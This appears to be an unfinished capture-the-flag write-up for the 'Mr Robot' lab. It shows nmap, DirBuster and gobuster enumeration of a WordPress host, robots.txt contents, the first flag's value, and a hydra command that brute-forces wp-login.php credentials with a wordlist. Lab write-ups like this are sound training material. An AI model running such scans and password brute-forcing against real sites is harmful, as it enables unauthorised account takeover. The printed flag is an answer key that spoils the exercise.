---
description: Based on the Mr. Robot show.
---

# Mr Robot CTF

## Scanner

> Generated on **Wed Jul 28 11:47:56 2021** with `nmap 7.91`.

```bash
nmap -sV -n -v -Pn -p- -T4 -A --open -oX portScan.xml 10.10.235.2
```

## Open Ports and Running Services

### 10.10.235.2

| Port | State | Service | Version |
| :--- | :--- | :--- | :--- |
| 80/tcp | open | http | Apache httpd |
| 443/tcp | open | http | Apache httpd |

{% tabs %}
{% tab title="OWASP DirB" %}
/usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt

\*
{% endtab %}

{% tab title="Second Tab" %}
```bash
DirBuster 1.0-RC1 - Report
http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project
Report produced on Wed Jul 28 12:49:07 EDT 2021
--------------------------------

http://10.10.235.2:80
--------------------------------
Directories found during testing:

Dirs found with a 403 response:

/images/
/blog/
/video/
/audio/
/js/
/css/
/admin/js/
/admin/images/
/js/vendor/
/admin/js/vendor/

Dirs found with a 200 response:

/
/admin/
/0/
/feed/
/image/
/wp-content/
/wp-login/
/wp-content/index/
/images/feed/
/image/2006/
/image/12/
/image/11/
/image/10/
/image/2005/
/image/1/
/image/09/
/blog/feed/
/image/08/
/image/01/
/image/06/
/image/2/
/image/07/
/image/05/
/image/04/
/image/03/
/image/02/
/image/3/
/image/13/
/image/4/
/image/14/
/image/15/
/js/feed/
/image/16/
/image/2004/
/image/18/
/image/20/
/image/21/
/wp-content/feed/
/image/5/
/wp-content/themes/
/image/22/
/image/6/
/image/19/
/image/24/
/image/2007/
/image/23/
/image/17/
/image/27/
/image/26/
/image/9/
/image/30/

Dirs found with a 301 response:

/rss/
/atom/
/images/rss/
/rss2/
/blog/rss/
/js/rss/
/wp-content/rss/
/image/rss/
/images/atom/
/atom/rss/
/audio/rss/
/feed/rss/
/0/rss/
/blog/atom/
/admin/rss/
/login/rss/
/rss/rss/
/video/rss/
/image/3/rss/
/image/02/rss/

Dirs found with a 302 response:

/login/


--------------------------------
Files found during testing:

Files found with a 200 responce:

/wp-login.php
/js/vendor/vendor-48ca455c.js.pagespeed.jm.V7Qfw6bd5C.js


--------------------------------

```
{% endtab %}
{% endtabs %}

{% embed url="http://10.10.105.131/robots.txt" %}

{% tabs %}
{% tab title="robots.txt" %}
```text
User-agent: *
fsocity.dic
key-1-of-3.txt
```
{% endtab %}

{% tab title="key-1-of-3.txt" %}
```text
073403c8a58a1f80d943455fb30724b9
```
{% endtab %}

{% tab title="curl" %}
```
curl -v http://10.10.105.131/wp-login.php
```
{% endtab %}

{% tab title="curl output" %}
```
*   Trying 10.10.105.131:80...
* Connected to 10.10.105.131 (10.10.105.131) port 80 (#0)
> GET /wp-login.php HTTP/1.1
> Host: 10.10.105.131
> User-Agent: curl/7.74.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Wed, 28 Jul 2021 17:16:05 GMT
< Server: Apache
< X-Powered-By: PHP/5.5.29
< Expires: Wed, 11 Jan 1984 05:00:00 GMT
< Cache-Control: no-cache, must-revalidate, max-age=0
< Pragma: no-cache
< X-Frame-Options: SAMEORIGIN
< Set-Cookie: wordpress_test_cookie=WP+Cookie+check; path=/
< Vary: Accept-Encoding
< X-Mod-Pagespeed: 1.9.32.3-4523
< Cache-Control: max-age=0, no-cache
< Content-Length: 2671
< Content-Type: text/html; charset=UTF-8
< 

```
{% endtab %}

{% tab title="gobuster" %}
```
$ gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -u http://10.10.19.249
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.19.249
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/07/28 13:49:45 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 235] [--> http://10.10.19.249/images/]
/blog                 (Status: 301) [Size: 233] [--> http://10.10.19.249/blog/]  
/sitemap              (Status: 200) [Size: 0]                                    
/rss                  (Status: 301) [Size: 0] [--> http://10.10.19.249/feed/]    
/login                (Status: 302) [Size: 0] [--> http://10.10.19.249/wp-login.php]
/0                    (Status: 301) [Size: 0] [--> http://10.10.19.249/0/]          
/video                (Status: 301) [Size: 234] [--> http://10.10.19.249/video/]    
/feed                 (Status: 301) [Size: 0] [--> http://10.10.19.249/feed/]       
/image                (Status: 301) [Size: 0] [--> http://10.10.19.249/image/]      
/atom                 (Status: 301) [Size: 0] [--> http://10.10.19.249/feed/atom/]  
/wp-content           (Status: 301) [Size: 239] [--> http://10.10.19.249/wp-content/]
/admin                (Status: 301) [Size: 234] [--> http://10.10.19.249/admin/]     
/audio                (Status: 301) [Size: 234] [--> http://10.10.19.249/audio/]     
/intro                (Status: 200) [Size: 516314]                                   
/wp-login             (Status: 200) [Size: 2606]                                     
/css                  (Status: 301) [Size: 232] [--> http://10.10.19.249/css/]       
/rss2                 (Status: 301) [Size: 0] [--> http://10.10.19.249/feed/]        
/license              (Status: 200) [Size: 309]                                      
/wp-includes          (Status: 301) [Size: 240] [--> http://10.10.19.249/wp-includes/]
/readme               (Status: 200) [Size: 64]                                        
/js                   (Status: 301) [Size: 231] [--> http://10.10.19.249/js/]         
/rdf                  (Status: 301) [Size: 0] [--> http://10.10.19.249/feed/rdf/]     
/page1                (Status: 301) [Size: 0] [--> http://10.10.19.249/]              
/robots               (Status: 200) [Size: 41]                                        
Progress: 2088 / 207644 (1.01%)                                                      ^C
[!] Keyboard interrupt detected, terminating.
                                                                                      
===============================================================
2021/07/28 14:06:16 Finished
===============================================================

```
{% endtab %}

{% tab title="" %}
```
hydra -L fsocity.dic \
      -P fsocity.dic 10.10.105.131 \
      -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' 
```
{% endtab %}
{% endtabs %}



